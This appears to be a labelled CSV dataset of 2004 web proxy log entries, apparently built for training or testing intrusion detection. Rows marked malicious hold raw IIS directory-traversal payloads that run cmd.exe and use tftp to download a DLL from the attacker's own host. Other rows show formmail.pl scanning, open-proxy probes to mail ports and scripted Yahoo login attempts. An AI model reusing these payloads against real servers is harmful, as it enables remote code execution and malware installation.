,ipaddress,dateandtime,url,statuscode,bytessent,refferer,useragent,class,malicious,url_sem_query,qtd_query_params,navegador
1860,68.48.142.117,10/Mar/2004:03:10:43 -0500,/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c1%1c../winnt/system32/cmd.exe,0,without browser
1861,68.48.142.117,10/Mar/2004:03:10:46 -0500,/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c1%1c../winnt/system32/cmd.exe,0,without browser
1862,68.48.142.117,10/Mar/2004:03:10:49 -0500,/scripts/..%c1%1c../httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c1%1c../httpodbc.dll,0,without browser
1863,68.48.142.117,10/Mar/2004:03:10:49 -0500,/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir ,400,305,"""-""",-,m,1,/scripts/..%c0%2f../winnt/system32/cmd.exe,0,without browser
1864,68.48.142.117,10/Mar/2004:03:10:52 -0500,/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/scripts/..%c0%af../winnt/system32/cmd.exe,0,without browser
1865,68.48.142.117,10/Mar/2004:03:10:52 -0500,/scripts/..%c0%af../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c0%af../winnt/system32/cmd.exe,0,without browser
1866,68.48.142.117,10/Mar/2004:03:10:55 -0500,/scripts/..%c0%af../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c0%af../winnt/system32/cmd.exe,0,without browser
1867,68.48.142.117,10/Mar/2004:03:10:58 -0500,/scripts/..%c0%af../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c0%af../winnt/system32/cmd.exe,0,without browser
1868,68.48.142.117,10/Mar/2004:03:10:58 -0500,/scripts/..%c0%af../httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c0%af../httpodbc.dll,0,without browser
1869,68.48.142.117,10/Mar/2004:03:10:58 -0500,/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/scripts/..%c1%9c../winnt/system32/cmd.exe,0,without browser
1870,68.48.142.117,10/Mar/2004:03:10:58 -0500,/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c1%9c../winnt/system32/cmd.exe,0,without browser
1871,68.48.142.117,10/Mar/2004:03:10:58 -0500,/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c1%9c../winnt/system32/cmd.exe,0,without browser
1872,68.48.142.117,10/Mar/2004:03:10:58 -0500,/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c1%9c../winnt/system32/cmd.exe,0,without browser
1873,68.48.142.117,10/Mar/2004:03:10:58 -0500,/scripts/..%c1%9c../httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c1%9c../httpodbc.dll,0,without browser
1874,68.48.142.117,10/Mar/2004:03:10:58 -0500,/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir ,400,289,"""-""",-,m,1,/scripts/..%%35%63../winnt/system32/cmd.exe,0,without browser
1875,68.48.142.117,10/Mar/2004:03:10:58 -0500,/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir ,400,289,"""-""",-,m,1,/scripts/..%%35c../winnt/system32/cmd.exe,0,without browser
1876,61.237.215.17,10/Mar/2004:03:10:59 -0500,http://hellynet.com/search.php?ID=1093&fString=Picture+Frames ,300,0,"""http://www.yanshi.cc/ys01/ys0100006/index-3-7.htm""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 98),n,0,/search.php,2,Microsoft Internet Explorer
1877,61.237.215.17,10/Mar/2004:03:11:01 -0500,http://hellynet.com/search_results.php?fSearch_id=d3b45a12ad1f1b00&fString=picture+frames ,200,14079,"""http://www.yanshi.cc/ys01/ys0100006/index-3-7.htm""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 98),n,0,/search_results.php,2,Microsoft Internet Explorer
1878,67.83.151.132,10/Mar/2004:03:11:02 -0500,http://www.glasriket.se/cgi-bin/formmail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/formmail.pl,0,Microsoft Internet Explorer
1879,61.237.215.17,10/Mar/2004:03:11:04 -0500,http://hellynet.com/redirect.php?fID=36291080 ,300,0,"""http://hellynet.com/search_results.php?fSearch_id=d3b45a12ad1f1b00&fString=picture+frames""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 98),n,0,/redirect.php,1,Microsoft Internet Explorer
1880,61.237.215.17,10/Mar/2004:03:11:05 -0500,http://rd6.galaxysearch.com/js?clickId=QocgEOM9OLR ,200,770,"""http://hellynet.com/search_results.php?fSearch_id=d3b45a12ad1f1b00&fString=picture+frames""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 98),n,0,/js,1,Microsoft Internet Explorer
1881,61.53.76.40,10/Mar/2004:03:11:12 -0500,http://69.59.175.60/found-best.com/search.php ,500,556,"""http://www.aprilgoldsgetpaid2reademail.com/pages/ptc.php""",Mozilla/4.78 [ja] (Win98; U),n,0,/found-best.com/search.php,0,without browser
1882,65.66.156.226,10/Mar/2004:03:11:20 -0500,http://login.india.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_iln_&passwd=cheater ,200,566,"""-""",-,n,0,/config/login,8,without browser
1883,213.196.208.80,10/Mar/2004:03:11:26 -0500,http://www.glocksoft.net/cgi-bin/jenv.cgi ,200,1169,"""-""",Mozilla/4.0,n,0,/cgi-bin/jenv.cgi,0,without browser
1884,213.196.208.80,10/Mar/2004:03:11:27 -0500,ftp.angelfire.com:21 ,400,291,"""-""",Mozilla/4.0,n,0,ftp.angelfire.com:21,0,without browser
1885,213.196.208.80,10/Mar/2004:03:11:30 -0500,www.somebody.net:443 ,200,0,"""-""",Advanced Administrative Tools,n,0,www.somebody.net:443,0,without browser
1886,68.48.142.117,10/Mar/2004:03:11:49 -0500,/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/scripts/..%25%35%63../winnt/system32/cmd.exe,0,without browser
1887,192.117.242.67,10/Mar/2004:03:12:02 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
1888,212.160.136.163,10/Mar/2004:03:12:03 -0500,http://www.searcheaven.net/cgi-bin/smartsearch/smartsearch.cgi?username=bmocking&keywords=mortgage ,200,36843,"""http://www.gemini.dogs.homerescue.org/""",Mozilla/4.0 (compatible; MSIE 5.02; Windows 98),n,0,/cgi-bin/smartsearch/smartsearch.cgi,2,Microsoft Internet Explorer
1889,203.121.182.141,10/Mar/2004:03:12:06 -0500,194.206.161.150:25 ,200,0,"""-""",-,n,0,194.206.161.150:25,0,without browser
1890,192.117.242.67,10/Mar/2004:03:12:07 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
1891,65.66.156.226,10/Mar/2004:03:12:24 -0500,http://login.europe.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_jcj_&passwd=cheater ,200,566,"""-""",-,n,0,/config/login,8,without browser
1892,61.172.244.109,10/Mar/2004:03:12:32 -0500,202.108.226.178:25 ,200,0,"""-""",-,n,0,202.108.226.178:25,0,without browser
1893,212.160.136.163,10/Mar/2004:03:12:37 -0500,http://www.searcheaven.net/cgi-bin/smartsearch/sf.cgi?t=ah&keys=zfzphdhfzzzfamzhzkzhccddfohadhzzsmdvsvfyzhxyahfpdphnshhvdhhadshsccscdxfxhcfzaaaafxszxahiddfcfoscahfnfhfpzyhshvzadvaaaxaodizzdafmcdcpavadfvaydvdzfcfpanahzkdpsmfkacfvsmdifxzycccsavddfdhsdzzyzcahfnzszzapsodsahaiadzsfnzyhfzsdksidsdzandnssfyfozhcssdspsnfmfdzmandmsyxazidadnhxsifsanzshdamzvhsdcfkhdfkdnsiashfsyzmckfpafsdsoddfvdcfizpcozmspsodmhasadxayfvdzadapdydyamfkdafvdyfpfvcdzsacdadffvzadmaofcddzycvzfdvfssosxspsssofyhzcdszanszscandhfzsadixzxpdpaidaddazzkzsdasxziciahdffxhsanavzsdcaoxkhoazahdcdssndiansisiahcxffsndhdfaoscssddaocsxpsafvspazadzfzhaazahxsxsnaiafzmaksphvacassvhnhohahnscaxansahksxzfzshzspsdadsnsyacavaaapxvfzhnhchhzshazzhksyhazx&kw=mortgage ,300,557,"""http://www.searcheaven.net/cgi-bin/smartsearch/smartsearch.cgi?username=bmocking&keywords=mortgage""",Mozilla/4.0 (compatible; MSIE 5.02; Windows 98),n,0,/cgi-bin/smartsearch/sf.cgi,3,Microsoft Internet Explorer
1894,212.160.136.163,10/Mar/2004:03:12:38 -0500,http://c.ah-ha.com/c?e1=pduJfETpCglzJJiCB2ebyPkHGxshLpH4su5RYtQxlE41qIFoUEFOoCWupssiXfDaghjuOT0NuZRvQ1YCBquQJVXINXlNZ24WWxUd4LfkpW4BOIPunyKSyd1qfUX1CQkar04tCv5SPqIdKy4FAwgdUoFYgTuDEeYuh1X4yycEfuytIi20Q5NZxUN1QUgLfYhUs2sVEXVmXzxOQHE0PzefT3dj1VDJrpBKNgImQraG3RVgAjA2N&h=KGtJoDwZg4C3FNAo0&b=47140 ,300,0,"""http://www.searcheaven.net/cgi-bin/smartsearch/smartsearch.cgi?username=bmocking&keywords=mortgage""",Mozilla/4.0 (compatible; MSIE 5.02; Windows 98),n,0,/c,3,Microsoft Internet Explorer
1895,68.48.142.117,10/Mar/2004:03:12:39 -0500,/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%25%35%63../winnt/system32/cmd.exe,0,without browser
1896,212.160.136.163,10/Mar/2004:03:12:40 -0500,http://c.ah-ha.com/c/2?e1=pduJfETpCglzJJiCB2ebyPkHGxshLpH4su5RYtQxlE41qIFoUEFOoCWupssiXfDaghjuOT0NuZRvQ1YCBquQJVXINXlNZ24WWxUd4LfkpW4BOIPunyKSyd1qfUX1CQkar04tCv5SPqIdKy4FAwgdUoFYgTuDEeYuh1X4yycEfuytIi20Q5NZxUN1QUgLfYhUs2sVEXVmXzxOQHE0PzefT3dj1VDJrpBKNgImQraG3RVgAjA2N&h=KGtJoDwZg4C3FNAo0&b=47140 ,300,0,"""http://www.searcheaven.net/cgi-bin/smartsearch/smartsearch.cgi?username=bmocking&keywords=mortgage""",Mozilla/4.0 (compatible; MSIE 5.02; Windows 98),n,0,/c/2,3,Microsoft Internet Explorer
1897,67.83.151.132,10/Mar/2004:03:12:47 -0500,http://www.jamieclarke.com/cgi-bin/formmail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/formmail.pl,0,Microsoft Internet Explorer
1898,212.160.136.163,10/Mar/2004:03:12:48 -0500,http://www.4yourhomeloan.com/ ,300,291,"""http://www.searcheaven.net/cgi-bin/smartsearch/smartsearch.cgi?username=bmocking&keywords=mortgage""",Mozilla/4.0 (compatible; MSIE 5.02; Windows 98),n,0,/,0,Microsoft Internet Explorer
1899,212.160.136.163,10/Mar/2004:03:13:05 -0500,http://www.4yourhomeloan.net/ ,200,53132,"""http://www.searcheaven.net/cgi-bin/smartsearch/smartsearch.cgi?username=bmocking&keywords=mortgage""",Mozilla/4.0 (compatible; MSIE 5.02; Windows 98),n,0,/,0,Microsoft Internet Explorer
1900,67.83.151.132,10/Mar/2004:03:13:23 -0500,http://www.rebuz.com/cgi-bin/formmail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/formmail.pl,0,Microsoft Internet Explorer
1901,65.66.156.226,10/Mar/2004:03:13:27 -0500,http://login.korea.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_joey___&passwd=cheater ,200,566,"""-""",-,n,0,/config/login,8,without browser
1902,68.48.142.117,10/Mar/2004:03:13:29 -0500,/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%25%35%63../winnt/system32/cmd.exe,0,without browser
1903,67.83.151.132,10/Mar/2004:03:13:41 -0500,http://www.nicoladexter.com/cgi-bin/formmail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/formmail.pl,0,Microsoft Internet Explorer
1904,65.66.156.226,10/Mar/2004:03:13:54 -0500,http://login.korea.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_kk_&passwd=cheater ,200,566,"""-""",-,n,0,/config/login,8,without browser
1905,65.66.156.226,10/Mar/2004:03:13:54 -0500,http://login.korea.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_kkg_&passwd=cheater ,200,566,"""-""",-,n,0,/config/login,8,without browser
1906,12.221.212.151,10/Mar/2004:03:13:56 -0500,http://www.sapphicerotica.com/members/index.html ,200,0,"""http://www.sapphicerotica.com/members/index.html""",Mozilla/4.0 ( compatible; MSIE 5.01; Windows 98; DigiExt ),n,0,/members/index.html,0,Microsoft Internet Explorer
1907,67.83.151.132,10/Mar/2004:03:13:56 -0500,http://www.salvation-films.com/cgi-bin/formmail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/formmail.pl,0,Microsoft Internet Explorer
1908,12.221.212.151,10/Mar/2004:03:13:57 -0500,http://www.sapphicerotica.com/members/index.html ,200,0,"""http://www.sapphicerotica.com/members/index.html""",Mozilla/3.01 ( compatible; [jp]; Windows 95; athome0107 ),n,0,/members/index.html,0,without browser
1909,67.125.136.193,10/Mar/2004:03:13:58 -0500,http://www.tnvgirls.com/members/ ,200,566,"""http://www.tnvgirls.com/members/""",Mozilla/4.73 ( compatible; [fr]; Windows NT4.0; DigiExt ),n,0,/members/,0,without browser
1910,67.83.151.132,10/Mar/2004:03:14:04 -0500,http://www3.ocn.ne.jp/cgi-bin/formmail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/formmail.pl,0,Microsoft Internet Explorer
1911,67.83.151.132,10/Mar/2004:03:14:15 -0500,http://www2.ocn.ne.jp/cgi-bin/formmail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/formmail.pl,0,Microsoft Internet Explorer
1912,68.48.142.117,10/Mar/2004:03:14:19 -0500,/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%25%35%63../winnt/system32/cmd.exe,0,without browser
1913,67.83.151.132,10/Mar/2004:03:14:36 -0500,http://www.crystal-mtn.com/cgi-bin/formmail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/formmail.pl,0,Microsoft Internet Explorer
1914,192.117.242.67,10/Mar/2004:03:14:44 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
1915,12.221.212.151,10/Mar/2004:03:14:57 -0500,http://www.sapphicerotica.com/members/index.html ,200,0,"""http://www.sapphicerotica.com/members/index.html""",Mozilla/5.0 ( compatible; [en]; Windows NT4.0; Compaq ),n,0,/members/index.html,0,without browser
1916,12.221.212.151,10/Mar/2004:03:14:57 -0500,http://www.sapphicerotica.com/members/index.html ,200,0,"""http://www.sapphicerotica.com/members/index.html""",Mozilla/3.01 ( compatible; [de]; Windows 95; DigiExt ),n,0,/members/index.html,0,without browser
1917,195.5.54.47,10/Mar/2004:03:14:59 -0500,http://195.5.54.47:8081/?SESS516607615 ,200,5,"""-""",-,n,0,/,0,without browser
1918,68.48.142.117,10/Mar/2004:03:15:12 -0500,/scripts/..%25%35%63../httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%25%35%63../httpodbc.dll,0,without browser
1919,67.83.151.132,10/Mar/2004:03:15:22 -0500,http://www.mslawyer.com/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
1920,65.66.156.226,10/Mar/2004:03:15:45 -0500,http://l1.login.scd.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_mot_&passwd=cheater ,200,566,"""-""",-,n,0,/config/login,8,without browser
1921,65.66.156.226,10/Mar/2004:03:15:45 -0500,http://l1.login.scd.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_o_r_c_a_&passwd=cheater ,200,566,"""-""",-,n,0,/config/login,8,without browser
1922,221.7.192.11,10/Mar/2004:03:15:52 -0500,http://ccbbs.cn/index.asp ,200,12711,"""http://ccbbs.cn/index.asp""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),n,0,/index.asp,0,Microsoft Internet Explorer
1923,203.121.182.141,10/Mar/2004:03:15:59 -0500,200.14.236.226:25 ,200,0,"""-""",-,n,0,200.14.236.226:25,0,without browser
1924,67.83.151.132,10/Mar/2004:03:15:59 -0500,http://www.esg.ndirect.co.uk/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
1925,68.48.142.117,10/Mar/2004:03:16:02 -0500,/scripts/..%252f../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/scripts/..%252f../winnt/system32/cmd.exe,0,without browser
1926,67.83.151.132,10/Mar/2004:03:16:39 -0500,http://www.tedthorsen.com/cgi-bin/formmail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/formmail.pl,0,Microsoft Internet Explorer
1927,195.5.54.47,10/Mar/2004:03:16:49 -0500,http://195.5.54.47:8081/?SESS576376557 ,200,5,"""-""",-,n,0,/,0,without browser
1928,68.48.142.117,10/Mar/2004:03:16:52 -0500,/scripts/..%252f../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%252f../winnt/system32/cmd.exe,0,without browser
1929,192.117.242.67,10/Mar/2004:03:17:02 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
1930,192.117.242.67,10/Mar/2004:03:17:05 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
1931,212.160.136.163,10/Mar/2004:03:17:19 -0500,http://www.helavasearch.com/cgi-bin/search.cgi?username=amundii&keywords=bank+account ,200,38199,"""http://www.powerlif.ifbbpro.net/""",Mozilla/4.0 (compatible; MSIE 4.01; Windows NT),n,0,/cgi-bin/search.cgi,2,Microsoft Internet Explorer
1932,212.160.136.163,10/Mar/2004:03:17:21 -0500,http://www.helavasearch.com/cgi-bin/go.cgi?u=ahhhzksczyzoss&k=axzczsafhxhnaksxhsaazvzx&url=spzhhnhkhhzaahhhzksfzfzkaxhhhssshazyhkzozfapsnsxzpzzzyaxhf&b=zsaaanzssvan&a=amundii&t=zcaaaozhaxaaznasanza&uid=4145217384 ,300,286,"""http://www.helavasearch.com/cgi-bin/search.cgi?username=amundii&keywords=bank+account""",Mozilla/4.0 (compatible; MSIE 4.01; Windows NT),n,0,/cgi-bin/go.cgi,7,Microsoft Internet Explorer
1933,67.83.151.132,10/Mar/2004:03:17:22 -0500,http://www.mainstreetgoldworks.com/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
1934,65.66.156.226,10/Mar/2004:03:17:23 -0500,http://l2.login.dcn.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_pug_&passwd=cheater ,200,566,"""-""",-,n,0,/config/login,8,without browser
1935,65.66.156.226,10/Mar/2004:03:17:24 -0500,http://l2.login.dcn.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_rd_&passwd=cheater ,200,566,"""-""",-,n,0,/config/login,8,without browser
1936,195.5.54.47,10/Mar/2004:03:17:34 -0500,http://195.5.54.47:8081/?SESS808832794 ,200,5,"""-""",-,n,0,/,0,without browser
1937,68.48.142.117,10/Mar/2004:03:17:43 -0500,/scripts/..%252f../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%252f../winnt/system32/cmd.exe,0,without browser
1938,67.83.151.132,10/Mar/2004:03:17:45 -0500,http://www.primarymonitor.com/cgi-bin/formmail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/formmail.pl,0,Microsoft Internet Explorer
1939,212.160.136.163,10/Mar/2004:03:17:48 -0500,http://www.ticketsreserve.com/ ,200,21256,"""http://www.helavasearch.com/cgi-bin/search.cgi?username=amundii&keywords=bank+account""",Mozilla/4.0 (compatible; MSIE 4.01; Windows NT),n,0,/,0,Microsoft Internet Explorer
1940,203.121.182.140,10/Mar/2004:03:17:49 -0500,209.15.20.38:25 ,200,0,"""-""",-,n,0,209.15.20.38:25,0,without browser
1941,220.173.17.142,10/Mar/2004:03:17:49 -0500,http://dbbsrv.com/image/443610/10004167 ,200,9090,"""http://www.so123.com""",Mozilla/4.0 (compatible; MSIE 5.02; Windows ME),n,0,/image/443610/10004167,0,Microsoft Internet Explorer
1942,218.93.92.137,10/Mar/2004:03:17:53 -0500,http://findbestsearch.com/?aff_id=69&str=Horoscopes ,200,578,"""http://www.livesnet.com/findbestsearch.htm""",Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0,n,0,/,2,Netscape
1943,67.83.151.132,10/Mar/2004:03:18:20 -0500,http://www.kinopolis.de/cgi-bin/formmail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/formmail.pl,0,Microsoft Internet Explorer
1944,68.48.142.117,10/Mar/2004:03:18:33 -0500,/scripts/..%252f../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%252f../winnt/system32/cmd.exe,0,without browser
1945,67.83.151.132,10/Mar/2004:03:18:33 -0500,http://www.news.nic.it/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
1946,67.83.151.132,10/Mar/2004:03:18:37 -0500,http://www.handtohandkajukenbo.com/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
1947,67.83.151.132,10/Mar/2004:03:18:48 -0500,http://www.kinopolis.de/cgi-bin/formmail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/formmail.pl,0,Microsoft Internet Explorer
1948,65.66.156.226,10/Mar/2004:03:19:00 -0500,http://l2.login.scd.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_rmp&passwd=cheater ,200,566,"""-""",-,n,0,/config/login,8,without browser
1949,65.66.156.226,10/Mar/2004:03:19:00 -0500,http://l2.login.scd.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_swan&passwd=cheater ,200,566,"""-""",-,n,0,/config/login,8,without browser
1950,68.48.142.117,10/Mar/2004:03:19:23 -0500,/scripts/..%252f../httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%252f../httpodbc.dll,0,without browser
1951,67.83.151.132,10/Mar/2004:03:19:33 -0500,http://www.ec.gc.ca/cgi-bin/formmail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/formmail.pl,0,Microsoft Internet Explorer
1952,67.83.151.132,10/Mar/2004:03:19:46 -0500,http://fastnet.it/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
